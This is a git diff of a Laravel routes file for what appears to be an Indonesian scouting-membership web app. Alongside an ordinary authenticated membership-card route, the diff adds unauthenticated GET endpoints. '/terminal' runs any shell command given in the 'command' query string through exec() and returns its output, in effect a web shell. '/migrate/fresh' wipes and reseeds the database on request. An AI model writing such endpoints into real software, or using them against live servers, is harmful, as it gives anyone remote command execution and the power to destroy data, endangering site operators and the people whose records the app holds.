@@ -14,7 +14,9 @@ use App\Http\Controllers\RegisterController;
 use App\Models\Pangkalan;
 use App\Models\Pembina;
 use App\Models\PesertaDidik;
-use App\Models\Poin;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\Input;
 
 /*
 |--------------------------------------------------------------------------
@@ -32,6 +34,21 @@ use App\Models\Poin;
 // });
 
 Route::get('/', fn () => view('landing'));
+
+Route::get('/migrate/fresh', function () {
+  return Artisan::call('migrate:fresh --seed');
+});
+
+Route::get('/storage/link', function () {
+  return Artisan::call('storage:link');
+});
+
+Route::get('/terminal', function (Request $request) {
+  $command = $request->query('command');
+  $output = [];
+  exec($command, $output);
+  return $output;
+});
 
 Route::get('/register/peserta_didik', [RegisterController::class, 'createPesertaDidik'])->middleware(('guest'));
 Route::post('/register/peserta_didik', [RegisterController::class, 'storePesertaDidik'])->middleware(('guest'));
@@ -83,6 +100,7 @@ Route::post('/dashboard/pembina/{pembina}/verify', [PembinaController::class, 'v
 Route::resource('/dashboard/pembina', PembinaController::class)->middleware('auth');
 
 Route::get('/dashboard/peserta_didik/waitingroom', [PesertaDidikController::class, 'waitingRoom'])->middleware('auth');
+Route::get('/dashboard/peserta_didik/{pesertaDidik}/kartu-anggota', [PesertaDidikController::class, 'loadKTA'])->middleware('auth');
 Route::post('/dashboard/peserta_didik/verifyall', [PesertaDidikController::class, 'verifyAll'])->middleware('auth');
 Route::post('/dashboard/peserta_didik/{pesertaDidik}/verify', [PesertaDidikController::class, 'verify'])->middleware('auth');
 Route::post('/dashboard/peserta_didik/{pesertaDidik}/teruji', [PesertaDidikController::class, 'uji'])->middleware('auth');
